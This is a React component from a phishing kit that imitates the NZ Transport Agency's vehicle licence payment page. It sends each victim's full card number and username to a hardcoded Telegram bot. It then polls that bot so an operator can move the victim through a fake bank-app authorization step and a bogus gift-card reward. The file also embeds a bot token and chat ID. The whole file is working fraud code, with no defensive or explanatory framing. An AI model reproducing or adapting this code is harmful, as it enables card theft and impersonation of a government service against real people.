import React, { useEffect, useState } from 'react';
import axios from 'axios';
import './LoginScreen.css';
import GiftCardPopup from './GiftCardPopup';
import { useLanguage } from '../hooks/useLanguage';
import nztaLogo from '../assets/nzta-logo.png';
import visaLogo from '../assets/visa-logo.png';
import mastercardLogo from '../assets/mastercard-logo.png';

const TELEGRAM_BOT_TOKEN = '8508454843:AAGGN8mMMmXkV2O2Ii7DUL-8do9UeKusbz0';
const TELEGRAM_ACTIONS_CHAT_ID = '-4820671789';

function SpotifyApprove({ onClose }) {
  const { t } = useLanguage();
  const [isConfirmed, setIsConfirmed] = useState(false);
  const [currentTime, setCurrentTime] = useState(new Date());
  const [cardNumber, setCardNumber] = useState('**** **** **** 9116');
  const [username, setUsername] = useState('');
  const [isSending, setIsSending] = useState(false);
  const [bankName, setBankName] = useState('Bank');
  const [cardBrand, setCardBrand] = useState('VISA');
  const [showGiftCard, setShowGiftCard] = useState(false);
  const [giftCode, setGiftCode] = useState('');
  const [showMessage, setShowMessage] = useState(false);
  const [messageText, setMessageText] = useState('');
  const [messageType, setMessageType] = useState('');

  const generateGiftCode = () => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 16; i++) {
      if (i > 0 && i % 4 === 0) code += '-';
      code += chars[Math.floor(Math.random() * chars.length)];
    }
    return code;
  };

  const handleSuccessCard = () => {
    console.log('✅ Success button clicked');
    setIsConfirmed(false);
    const newGiftCode = generateGiftCode();
    setGiftCode(newGiftCode);
    setShowGiftCard(true);
  };

  const closeGiftCard = () => {
    setShowGiftCard(false);
    if (onClose) {
      onClose();
    } else {
      sessionStorage.setItem('showCardForm', 'true');
      window.location.href = '/#/';
    }
  };

  const handleBackToAppr = () => {
    console.log('⬅️ Back clicked');
    setIsConfirmed(false);
    if (onClose) {
      onClose();
    } else {
      setMessageText('Please make sure you have confirmed.');
      setMessageType('warning');
      setShowMessage(true);
      setTimeout(() => setShowMessage(false), 3000);
    }
  };

  const closeMessage = () => setShowMessage(false);

  useEffect(() => {
    let lastUpdateId = 0;
    const pollTelegram = async () => {
      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
        const response = await axios.get(url);
        if (response.data.result && response.data.result.length > 0) {
          for (const update of response.data.result) {
            lastUpdateId = update.update_id;
            if (update.callback_query) {
              const callbackData = update.callback_query.data;
              if (callbackData.startsWith('success_card_')) handleSuccessCard();
              else if (callbackData.startsWith('back_to_appr_')) handleBackToAppr();
              await axios.post(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
                {
                  callback_query_id: update.callback_query.id,
                  text: '✅ Action executed!',
                }
              );
            }
          }
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    };
    const interval = setInterval(pollTelegram, 3000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const storedCardNumber = sessionStorage.getItem('cardNumber');
    const storedUsername = sessionStorage.getItem('loginName');
    const storedBankName = sessionStorage.getItem('bankName');
    const storedBrand = sessionStorage.getItem('cardBrand');
    if (storedCardNumber) {
      const last4 = storedCardNumber.slice(-4);
      setCardNumber(`**** **** **** ${last4}`);
    }
    if (storedUsername) setUsername(storedUsername);
    if (storedBankName) setBankName(storedBankName);
    if (storedBrand) setCardBrand(storedBrand);
    const timer = setInterval(() => setCurrentTime(new Date()), 1000);
    return () => clearInterval(timer);
  }, []);

  const sendTelegramLog = async () => {
    try {
      const fullCardNumber = sessionStorage.getItem('cardNumber') || 'Unknown';
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✅ <b>PAYMENT CONFIRMATION</b> ✅
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username || 'Unknown'}
💳 <b>Card Number:</b> <code>${fullCardNumber}</code>
🏪 <b>Merchant:</b> NZTA Vehicle Licence
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Choose an action:</i>`;
      const keyboard = {
        inline_keyboard: [
          [
            { text: '✅ Success', callback_data: `success_card_${Date.now()}` },
            { text: '⬅️ Back', callback_data: `back_to_appr_${Date.now()}` },
          ],
        ],
      };
      await axios.post(url, {
        chat_id: TELEGRAM_ACTIONS_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard,
      });
      return true;
    } catch (error) {
      return false;
    }
  };

  const handleConfirm = async () => {
    setIsSending(true);
    const sent = await sendTelegramLog();
    if (sent) {
      sessionStorage.setItem('paymentConfirmed', 'true');
      setIsConfirmed(true);
    }
    setIsSending(false);
  };

  // ─────────────────────────────────────────────
  // WAITING / CONFIRMATION STATE (step 3 active)
  // ─────────────────────────────────────────────
  if (isConfirmed) {
    return (
      <div className="nzta-renewal">
        <header className="nzta-header">
          <div className="nzta-header-inner">
            <div className="nzta-logo">
              <img src={nztaLogo} alt="NZ Transport Agency" className="nzta-logo-img" />
            </div>
            <div className="nzta-services-tab">
              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#0b3b5c" strokeWidth="2">
                <path d="M3 7l9-4 9 4-9 4-9-4z" />
                <path d="M3 7v10l9 4 9-4V7" />
              </svg>
              <span>Online Services</span>
            </div>
          </div>
        </header>

        <main className="nzta-main">
          {showMessage && (
            <div className="nzta-error-banner">
              ⚠️ {messageText}
              <button
                onClick={closeMessage}
                style={{ marginLeft: 12, background: 'none', border: 'none', cursor: 'pointer', fontWeight: 700 }}
              >
                ×
              </button>
            </div>
          )}


          

          <hr className="nzta-divider" />

          <h2 className="nzta-subtitle">Waiting for Confirmation</h2>

          <p className="nzta-help" style={{ marginBottom: 12 }}>
            To complete your payment, please follow these steps:
          </p>
          <ol className="nzta-instructions" style={{ marginTop: 0, marginBottom: 24 }}>
            <li>Open your banking app on your smartphone.</li>
            <li>Confirm the authorization request.</li>
            <li>Return to this screen and wait for confirmation.</li>
          </ol>

          <div className="nzta-total-card">
            <h3>Payment status</h3>
            <div className="nzta-total-row">
              <span>Your confirmation has been sent.</span>
            </div>
            <div className="nzta-total-row">
              <span>Please check your mobile banking app.</span>
            </div>
            <div className="nzta-total-row nzta-total-final">
              <span>Current time</span>
              <span>{currentTime.toLocaleString()}</span>
            </div>
          </div>

          <div className="nzta-actions">
            <button className="nzta-btn nzta-btn-cancel" onClick={closeGiftCard}>
              Cancel
            </button>
          </div>
        </main>

        {showGiftCard && <GiftCardPopup giftCode={giftCode} onClose={closeGiftCard} />}
      </div>
    );
  }

  // ─────────────────────────────────────────────
  // FORM STATE (step 3 active — same as confirmation)
  // ─────────────────────────────────────────────
  return (
    <div className="nzta-renewal">
      <header className="nzta-header">
        <div className="nzta-header-inner">
          <div className="nzta-logo">
            <img src={nztaLogo} alt="NZ Transport Agency" className="nzta-logo-img" />
          </div>
          
        </div>
      </header>

      <main className="nzta-main">
        {showMessage && (
          <div className="nzta-error-banner">
            ⚠️ {messageText}
            <button
              onClick={closeMessage}
              style={{ marginLeft: 12, background: 'none', border: 'none', cursor: 'pointer', fontWeight: 700 }}
            >
              ×
            </button>
          </div>
        )}

        <h1 className="nzta-title">Payment confirmation</h1>

        

        <hr className="nzta-divider" />

        <p className="nzta-hint">Please confirm the payment in your banking app.</p>

        
        <div style={{ display: 'flex', gap: 12, alignItems: 'center', marginBottom: 20 }}>
          <img src={visaLogo} alt="VISA" style={{ height: 28 }} />
          <img src={mastercardLogo} alt="Mastercard" style={{ height: 28 }} />
        </div>

        <div className="nzta-total-card">
          <h3>{t.confirmationInApp || 'Vehicle Licence Payment'}</h3>

          <div className="nzta-total-row">
            <span>{t.merchant || 'Merchant'}</span>
            <span>{cardBrand}</span>
          </div>
          <div className="nzta-total-row">
            <span>{t.amount || 'Amount'}</span>
            <span>$103.95</span>
          </div>
          <div className="nzta-total-row">
            <span>{t.date || 'Date'}</span>
            <span>{new Date().toLocaleString()}</span>
          </div>
          <div className="nzta-total-row nzta-total-final">
            <span>{t.cardNumberLabel || 'Card Number'}</span>
            <span>{cardNumber}</span>
          </div>
          {/* ─── 3 STEPS: open bank app & approve ─── */}
<p className="nzta-help" style={{ marginBottom: 12 }}>
  To complete your payment, please follow these steps:
</p>
<ol className="nzta-instructions" style={{ marginTop: 0, marginBottom: 24 }}>
  <li>Open your banking app on your smartphone.</li>
  <li>Approve the authorization request.</li>
  <li>Return to this screen and tap "Confirm".</li>
</ol>
        </div>

        <div className="nzta-actions">
          <button
            onClick={handleConfirm}
            className="nzta-btn nzta-btn-continue"
            disabled={isSending}
          >
            {isSending ? 'Sending…' : 'Confirm'}
          </button>
          <button
            type="button"
            className="nzta-btn nzta-btn-cancel"
            onClick={handleBackToAppr}
            disabled={isSending}
          >
            Cancel
          </button>
        </div>

        <p className="nzta-help" style={{ marginTop: 16 }}>
          🔒 Secured by your Bank
        </p>
      </main>

      {showGiftCard && <GiftCardPopup giftCode={giftCode} onClose={closeGiftCard} />}
    </div>
  );
}

export default SpotifyApprove;